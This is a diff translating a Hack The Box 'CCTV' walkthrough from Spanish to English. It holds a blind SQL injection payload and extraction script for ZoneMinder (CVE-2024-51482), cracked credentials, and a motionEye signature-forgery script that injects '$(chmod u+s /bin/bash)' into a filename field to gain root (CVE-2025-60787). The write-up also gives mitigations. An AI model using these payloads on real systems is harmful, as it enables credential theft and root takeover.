@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: CCTV"
 date: 2026-06-22
 draft: false
-description: "Walkthrough completo de la máquina CCTV de Hack The Box. Dificultad Medium, OS Linux. SQL Injection ciega en ZoneMinder (CVE-2024-51482) para extraer hashes bcrypt, cracking offline, y escalada a root mediante falsificación de firma de API en motionEye (CVE-2025-60787) con inyección de comandos en nombre de fichero."
+description: "Full walkthrough of the CCTV machine from Hack The Box. Medium difficulty, Linux. Boolean-based blind SQL Injection on ZoneMinder (CVE-2024-51482) to extract bcrypt hashes, offline cracking, and root escalation via forged API signature in motionEye (CVE-2025-60787) with command injection in the filename field."
 tags: ["HackTheBox", "Linux", "Medium", "SQLi", "BlindSQLi", "ZoneMinder", "CVE-2024-51482", "bcrypt", "JohnTheRipper", "motionEye", "CVE-2025-60787", "HMAC", "RCE", "SUID", "PrivEsc", "cctv", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **CCTV** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux**. ZoneMinder expuesto con credenciales por defecto es vulnerable al **CVE-2024-51482**, una SQL Injection ciega que nos permite extraer hashes bcrypt y obtener acceso SSH. Una vez dentro, motionEye corre como root con su clave de firma de API expuesta en un fichero de configuración legible — combinación que explota el **CVE-2025-60787** para inyectar un comando en el nombre de fichero de captura y obtener SUID en `/bin/bash`.
+Walkthrough of **CCTV** on Hack The Box. **Medium** difficulty machine running **Linux**. ZoneMinder exposed with default credentials is vulnerable to **CVE-2024-51482**, a blind SQL Injection that lets us extract bcrypt hashes and gain SSH access. Once inside, motionEye runs as root with its API signing key exposed in a readable configuration file — a combination that exploits **CVE-2025-60787** to inject a command into a capture filename and set SUID on `/bin/bash`.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,21 +18,21 @@ Resolución de **CCTV** en Hack The Box. Máquina de dificultad **Medium** con s
 
 ---
 
-## 🗺️ Información de la Máquina
+## 🗺️ Machine Info
 
-| Campo          | Detalle                                                                                       |
+| Field          | Detail                                                                                        |
 |----------------|-----------------------------------------------------------------------------------------------|
-| **Nombre**     | CCTV                                                                                          |
+| **Name**       | CCTV                                                                                          |
 | **OS**         | Linux                                                                                         |
-| **Dificultad** | Medium                                                                                        |
+| **Difficulty** | Medium                                                                                        |
 | **IP**         | 10.129.244.156                                                                                |
-| **Técnicas**   | CVE-2024-51482 · Boolean-based Blind SQLi · bcrypt Cracking · CVE-2025-60787 · SUID PrivEsc  |
+| **Techniques** | CVE-2024-51482 · Boolean-based Blind SQLi · bcrypt Cracking · CVE-2025-60787 · SUID PrivEsc  |
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### 1.1 Escaneo de Puertos
+### 1.1 Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.156
@@ -48,23 +48,23 @@ PORT   STATE SERVICE
 echo "10.129.244.156 cctv.htb" >> /etc/hosts
 ```
 
-> **💡 Superficie de ataque:** Solo SSH y un servicio web. Toda la investigación inicial pasa necesariamente por la aplicación web en el puerto 80.
+> **💡 Attack surface:** Only SSH and a web service. All initial investigation necessarily goes through the web application on port 80.
 
 ---
 
-## 2. Enumeración Web — ZoneMinder
+## 2. Web Enumeration — ZoneMinder
 
-Al visitar `http://cctv.htb` encontramos un panel de staff login. Probamos credenciales por defecto:
+Visiting `http://cctv.htb` we find a staff login panel. We try default credentials:
 
 ```
 admin : admin
 ```
 
-✅ Acceso concedido. La aplicación es **ZoneMinder v1.37.63**, un sistema de videovigilancia de código abierto.
+✅ Access granted. The application is **ZoneMinder v1.37.63**, an open-source video surveillance system.
 
-> **⚠️ Vulnerabilidad identificada:** Esta versión es vulnerable a **CVE-2024-51482**, una SQL Injection ciega en el parámetro `tid` del endpoint `web/ajax/event.php`. Cualquier usuario autenticado — incluyendo `admin:admin` por defecto — puede explotarla.
+> **⚠️ Vulnerability identified:** This version is vulnerable to **CVE-2024-51482**, a blind SQL Injection in the `tid` parameter of the `web/ajax/event.php` endpoint. Any authenticated user — including `admin:admin` by default — can exploit it.
 
-Probamos primero el exploit público de referencia basado en time-based SQLi:
+We first try the public time-based reference exploit:
 
 ```bash
 python3 CVE-2024-51482.py -i 10.129.244.156 -u admin -p admin --test
@@ -74,32 +74,32 @@ python3 CVE-2024-51482.py -i 10.129.244.156 -u admin -p admin --test
 [-] Target does not appear vulnerable
 ```
 
-El servidor amortigua los retardos de `SLEEP()`, así que la detección time-based falla. Sin embargo, el parámetro `tid` sigue sin sanitizar — cambiamos el enfoque a **boolean-based blind SQLi**: en lugar de medir tiempos, observamos si la clave `"response"` aparece o no en el JSON de respuesta según si la condición inyectada es verdadera o falsa.
+The server buffers `SLEEP()` delays, so time-based detection fails. However, the `tid` parameter is still unsanitized — we switch to **boolean-based blind SQLi**: instead of measuring time, we observe whether the `"response"` key appears or not in the JSON response depending on whether the injected condition is true or false.
 
-### 2.1 Petición Vulnerable
+### 2.1 Vulnerable Request
 
 ```
 GET /zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD>
-Cookie: ZMSESSID=<cookie_de_sesión>
+Cookie: ZMSESSID=<session_cookie>
 ```
 
-### 2.2 Lógica del Payload
+### 2.2 Payload Logic
 
 ```sql
--- ¿El primer carácter del hash de la contraseña de mark es '$' (ASCII 36)?
+-- Is the first character of mark's password hash '$' (ASCII 36)?
 0 UNION SELECT 1,2,3,4 FROM Users WHERE Id=2 AND ASCII(SUBSTRING(Password,1,1))=36
 ```
 
-Si la condición es verdadera, la respuesta cambia de forma detectable. Iterando posición a posición y carácter a carácter extraemos el hash completo sin retardos de tiempo.
+If the condition is true, the response changes in a detectable way. Iterating position by position and character by character we extract the full hash without time delays.
 
-### 2.3 Script de Extracción
+### 2.3 Extraction Script
 
 ```python
 import requests, sys
 
 URL    = 'http://cctv.htb/zm/index.php'
 COOKIE = {'ZMSESSID': sys.argv[1]}
-# Charset optimizado para bcrypt ($2y$10$...)
+# Charset optimized for bcrypt ($2y$10$...)
 CHARSET = [ord(c) for c in '$2abcdefghijklmnopqrstuvwxyz0123456789./ABCDEFGHIJKLMNOPQRSTUVWXYZ']
 
 def check(user_id, pos, asc_val):
@@ -126,9 +126,9 @@ for uid, uname in [(1,'superadmin'),(2,'mark')]:
     print(f'{uname} hash: {password}')
 ```
 
-El charset prioriza los caracteres típicos de un hash bcrypt (`$`, dígitos, letras y `./`) para reducir el número de peticiones necesarias por posición.
+The charset prioritizes typical bcrypt characters (`$`, digits, letters, and `./`) to reduce the number of requests needed per position.
 
-Extraemos el `ZMSESSID` de la sesión autenticada y ejecutamos:
+We extract the `ZMSESSID` from the authenticated session and run:
 
 ```bash
 python3 sqli.py jalvld8p48s3gpba63pb8gi3ho
@@ -141,9 +141,9 @@ mark hash:       $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
 
 ---
 
-## 3. Cracking del Hash y Acceso SSH
+## 3. Hash Cracking and SSH Access
 
-Guardamos el hash de `mark` y lo crackeamos con John the Ripper:
+We save `mark`'s hash and crack it with John the Ripper:
 
 ```bash
 echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
@@ -159,7 +159,7 @@ opensesame       (?)
 1g 0:00:01:06 DONE — 0.01503g/s 89.82p/s
 ```
 
-> **🔑 Credenciales obtenidas:** `mark:opensesame`
+> **🔑 Credentials obtained:** `mark:opensesame`
 
 ```bash
 ssh mark@cctv.htb
@@ -178,13 +178,13 @@ uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
 mark@cctv:~$ cat /home/sa_mark/user.txt
 ```
 
-> 🔑 Flag de usuario obtenida.
+> 🔑 User flag obtained.
 
 ---
 
-## 5. Escalada de Privilegios — motionEye como Root
+## 5. Privilege Escalation — motionEye Running as Root
 
-### 5.1 Enumeración de Servicios Locales
+### 5.1 Local Service Enumeration
 
 ```bash
 mark@cctv:~$ ss -tlnp
@@ -204,9 +204,9 @@ mark@cctv:~$ grep User /etc/systemd/system/motioneye.service
 User=root
 ```
 
-> **💡 Hallazgo clave:** **motionEye** (puertos `7999` y `8765`) se ejecuta como **root**. Si conseguimos ejecutar código a través de él, la escalada es directa.
+> **💡 Key finding:** **motionEye** (ports `7999` and `8765`) runs as **root**. If we can execute code through it, escalation is direct.
 
-### 5.2 Clave de Firma Expuesta en la Configuración
+### 5.2 Signing Key Exposed in Configuration
 
 ```bash
 mark@cctv:~$ cat /etc/motioneye/motion.conf
@@ -222,30 +222,30 @@ webcontrol_port 7999
 webcontrol_localhost on
 ```
 
-> **💡 Dato crítico:** `admin_password` no es la contraseña en texto plano — es el hash que motionEye usa como **clave de firma HMAC** para autenticar peticiones a su API REST. Cada petición debe incluir un parámetro `_signature` calculado con esa clave. Como `mark` puede leer este fichero, tenemos la clave sin necesidad de las credenciales reales. Esta es la base del **CVE-2025-60787**.
+> **💡 Critical data:** `admin_password` is not the plaintext password — it's the hash that motionEye uses as the **HMAC signing key** to authenticate requests to its REST API. Each request must include a `_signature` parameter computed with that key. Since `mark` can read this file, we have the key without needing the real credentials. This is the basis of **CVE-2025-60787**.
 
 ---
 
-## 6. Explotación — CVE-2025-60787: Firma Falsificada + RCE vía Nombre de Fichero
+## 6. Exploitation — CVE-2025-60787: Forged Signature + RCE via Filename
 
-### 6.1 Análisis de la Vulnerabilidad
+### 6.1 Vulnerability Analysis
 
-CVE-2025-60787 combina dos problemas en motionEye:
+CVE-2025-60787 combines two problems in motionEye:
 
-1. **Clave de firma legible por usuarios no administrativos:** Con acceso a `motion.conf`, cualquier usuario local puede firmar peticiones arbitrarias a la API administrativa sin conocer la contraseña real.
+1. **Signing key readable by non-administrative users:** With access to `motion.conf`, any local user can sign arbitrary requests to the administrative API without knowing the real password.
 
-2. **Inyección de comandos en `image_file_name`:** El campo que define el nombre de las capturas de cámara soporta plantillas tipo strftime (`%Y-%m-%d`), pero no sanea el contenido `$(...)`. Cuando motion genera el nombre de archivo a través de un shell, cualquier subcomando embebido se ejecuta — y como el servicio corre como root, el comando se ejecuta con privilegios de root.
+2. **Command injection in `image_file_name`:** The field defining capture filenames supports strftime-style templates (`%Y-%m-%d`), but doesn't sanitize `$(...)` content. When motion generates the filename through a shell, any embedded subcommand executes — and since the service runs as root, the command runs with root privileges.
 
 ```
-Flujo normal:    image_file_name = "capture_%Y-%m-%d" → motion genera "capture_2026-06-22"
-Flujo malicioso: image_file_name = "$(chmod u+s /bin/bash).%Y-%m-%d"
-                 → motion invoca shell para expandir la plantilla
-                 → subcomando ejecutado como root → /bin/bash obtiene bit SUID
+Normal flow:    image_file_name = "capture_%Y-%m-%d" → motion generates "capture_2026-06-22"
+Malicious flow: image_file_name = "$(chmod u+s /bin/bash).%Y-%m-%d"
+                → motion invokes shell to expand the template
+                → subcommand executed as root → /bin/bash gets SUID bit
 ```
 
-### 6.2 Cálculo de la Firma
+### 6.2 Signature Computation
 
-motionEye firma las peticiones concatenando método HTTP, ruta normalizada, cuerpo y clave, y calculando SHA-1 sobre el resultado. Reproducimos el algoritmo exacto:
+motionEye signs requests by concatenating HTTP method, normalized path, body, and key, then computing SHA-1 over the result. We reproduce the exact algorithm:
 
 ```python
 import hashlib, re, urllib.parse, requests, json
@@ -268,9 +268,9 @@ def compute_sig(method, path_with_query, body=""):
     return hashlib.sha1(f"{method}:{path}:{body_str}:{k}".encode()).hexdigest().lower()
 ```
 
-### 6.3 Ejecución del Exploit
+### 6.3 Exploit Execution
 
-**Paso 1 — Leer la configuración actual de la cámara** (necesaria para el `set`, que requiere el objeto completo):
+**Step 1 — Read the current camera configuration** (needed for the `set`, which requires the full object):
 
 ```python
 qget = "/config/1/get?_username=admin"
@@ -278,7 +278,7 @@ r    = requests.get(f"{BASE}{qget}&_signature={compute_sig('GET', qget)}")
 ui   = r.json()
 ```
 
-**Paso 2 — Inyectar el payload en `image_file_name`:**
+**Step 2 — Inject the payload into `image_file_name`:**
 
 ```python
 ui["image_file_name"] = "$(chmod u+s /bin/bash).%Y-%m-%d"
@@ -286,9 +286,9 @@ ui["capture_mode"]    = "all-frames"
 ui["still_images"]    = True
 ```
 
-Activar `all-frames` fuerza a motion a generar capturas de forma continua, garantizando que el nombre de archivo malicioso se evalúe pronto.
+Enabling `all-frames` forces motion to generate captures continuously, guaranteeing the malicious filename gets evaluated quickly.
 
-**Paso 3 — Enviar la configuración envenenada:**
+**Step 3 — Send the poisoned configuration:**
 
 ```python
 body = json.dumps(ui)
@@ -306,7 +306,7 @@ mark@cctv:/tmp$ python3 exploit.py
 [*] Config update: 200 — {"reload": false, "reboot": false, "error": null}
 ```
 
-Tras el reinicio del servicio `motion`, el subcomando se ejecuta como root y `/bin/bash` queda con SUID:
+After the `motion` service restarts, the subcommand executes as root and `/bin/bash` gets SUID:
 
 ```bash
 mark@cctv:/tmp$ /bin/bash -p
@@ -314,7 +314,7 @@ bash-5.2# id
 uid=1000(mark) gid=1000(mark) euid=0(root) groups=1000(mark)
 ```
 
-✅ **Shell con EUID 0 (root) obtenida.**
+✅ **Shell with EUID 0 (root) obtained.**
 
 ---
 
@@ -324,40 +324,40 @@ uid=1000(mark) gid=1000(mark) euid=0(root) groups=1000(mark)
 bash-5.2# cat /root/root.txt
 ```
 
-> 🏁 Flag de root obtenida.
+> 🏁 Root flag obtained.
 
 ---
 
-## 8. Resumen y Lecciones Aprendidas
+## 8. Summary and Lessons Learned
 
-**Ruta de compromiso:**
+**Compromise path:**
 
-1. **Recon** → Puerto 80 con ZoneMinder v1.37.63; credenciales por defecto `admin:admin`.
-2. **CVE-2024-51482** → Boolean-based blind SQLi en `tid` → hashes bcrypt de `superadmin` y `mark`.
+1. **Recon** → Port 80 with ZoneMinder v1.37.63; default credentials `admin:admin`.
+2. **CVE-2024-51482** → Boolean-based blind SQLi on `tid` → bcrypt hashes of `superadmin` and `mark`.
 3. **Cracking** → John + rockyou.txt → `mark:opensesame` → SSH.
-4. **Enumeración local** → motionEye en puertos 7999/8765 corriendo como root; `motion.conf` legible con clave de firma expuesta.
-5. **CVE-2025-60787** → Firma HMAC falsificada + inyección `$(...)` en `image_file_name` → `chmod u+s /bin/bash` ejecutado como root.
-6. **Flags** → User flag en `/home/sa_mark/user.txt`; root flag con `/bin/bash -p`.
+4. **Local enumeration** → motionEye on ports 7999/8765 running as root; readable `motion.conf` with exposed signing key.
+5. **CVE-2025-60787** → Forged HMAC signature + `$(...)` injection in `image_file_name` → `chmod u+s /bin/bash` executed as root.
+6. **Flags** → User flag at `/home/sa_mark/user.txt`; root flag with `/bin/bash -p`.
 
-**Lo que aprendí con esta máquina:**
+**What I learned from this machine:**
 
-- **Las credenciales por defecto siguen siendo el vector de entrada más frecuente y más ignorado.** ZoneMinder se instala con `admin:admin` y muchas instancias en producción nunca lo cambian. Sin esas credenciales, la SQLi del CVE-2024-51482 no es explotable (requiere estar autenticado) — el hardening más básico habría cortado el ataque en el primer paso.
+- **Default credentials are still the most frequent and most ignored entry vector.** ZoneMinder installs with `admin:admin` and many production instances never change it. Without those credentials, the SQLi in CVE-2024-51482 is not exploitable (requires authentication) — the most basic hardening would have cut the attack at the first step.
 
-- **Time-based SQLi y boolean-based SQLi no son intercambiables.** Cuando el servidor amortigua los retardos (WAF, pooling de conexiones, configuración del motor), la detección por tiempo falla aunque la inyección exista. El cambio a boolean-based — observar diferencias en el contenido de la respuesta en lugar de en el tiempo — es el siguiente paso natural y funcionó perfectamente aquí.
+- **Time-based SQLi and boolean-based SQLi are not interchangeable.** When the server buffers delays (WAF, connection pooling, engine configuration), time-based detection fails even though the injection exists. Switching to boolean-based — observing differences in response content rather than timing — is the natural next step and worked perfectly here.
 
-- **Un fichero de configuración legible puede valer más que una contraseña.** La clave `admin_password` en `motion.conf` no era la contraseña del usuario — era la clave criptográfica de firma de toda la API. Tener acceso de lectura a ese fichero equivalía a tener acceso administrativo completo a motionEye sin conocer ninguna credencial real. El principio de mínimo privilegio sobre ficheros de configuración no es solo una buena práctica — es una línea de defensa concreta.
+- **A readable configuration file can be worth more than a password.** The `admin_password` key in `motion.conf` wasn't the user's password — it was the cryptographic signing key for the entire API. Read access to that file was equivalent to full administrative access to motionEye without knowing any real credentials. The principle of least privilege on configuration files isn't just a best practice — it's a concrete defensive layer.
 
-- **Los sistemas de templating que invocan un shell son un vector de inyección de comandos inmediato si no sanitizan la entrada.** `image_file_name` soportaba sustituciones de variables, lo que requiere invocar un shell para expandirlas. Cualquier campo que pase por un shell sin sanitizar `$()` es potencialmente vulnerable. La corrección no es sanitizar mejor — es no invocar un shell para expandir plantillas cuando no es estrictamente necesario.
+- **Templating systems that invoke a shell are an immediate command injection vector if they don't sanitize input.** `image_file_name` supported variable substitutions, which requires invoking a shell to expand them. Any field that goes through a shell without sanitizing `$()` is potentially vulnerable. The fix isn't better sanitization — it's not invoking a shell for template expansion when it's not strictly necessary.
 
-- **Un servicio corriendo como root con capacidad de escritura en el sistema de ficheros es una escalada inmediata.** El SUID en `/bin/bash` es uno de los payloads más simples posibles — no requiere exploits de kernel, no depende de la arquitectura, y funciona mientras `/bin/bash` exista. El problema raíz no es el payload sino que motion corre como root innecesariamente.
+- **A service running as root with the ability to write to the filesystem is immediate escalation.** SUID on `/bin/bash` is one of the simplest possible payloads — no kernel exploits needed, not architecture-dependent, works as long as `/bin/bash` exists. The root problem isn't the payload but that motion runs as root unnecessarily.
 
-**Mitigaciones:**
+**Mitigations:**
 
-| Vector | Mitigación |
+| Vector | Mitigation |
 |--------|------------|
-| Credenciales por defecto en ZoneMinder | Forzar cambio en el primer inicio de sesión; eliminar credenciales por defecto antes de exponer el panel |
-| CVE-2024-51482 — SQLi ciega en `tid` | Actualizar ZoneMinder a versión parcheada; usar prepared statements en todos los endpoints AJAX |
-| Clave de firma legible por usuarios no administrativos | Restringir permisos de `motion.conf` a solo `root`; no derivar claves de firma de la contraseña de administrador |
-| motionEye ejecutándose como root | Ejecutar con un usuario dedicado sin privilegios; usar `setcap` si se necesita acceso a dispositivos de cámara |
-| CVE-2025-60787 — inyección vía `image_file_name` | Actualizar motionEye a versión parcheada; no expandir plantillas de nombre de fichero mediante un shell |
-| Ausencia de segmentación entre servicios y privilegios root | Auditar periódicamente qué servicios locales corren con privilegios elevados innecesarios |
+| Default credentials in ZoneMinder | Force change on first login; remove default credentials before exposing the panel |
+| CVE-2024-51482 — blind SQLi on `tid` | Update ZoneMinder to patched version; use prepared statements on all AJAX endpoints |
+| Signing key readable by non-administrative users | Restrict `motion.conf` permissions to root only; don't derive signing keys from admin passwords |
+| motionEye running as root | Run with a dedicated unprivileged user; use `setcap` if camera device access is needed |
+| CVE-2025-60787 — injection via `image_file_name` | Update motionEye to patched version; don't expand filename templates via a shell |
+| No segmentation between services and root privileges | Periodically audit which local services run with unnecessarily elevated privileges |
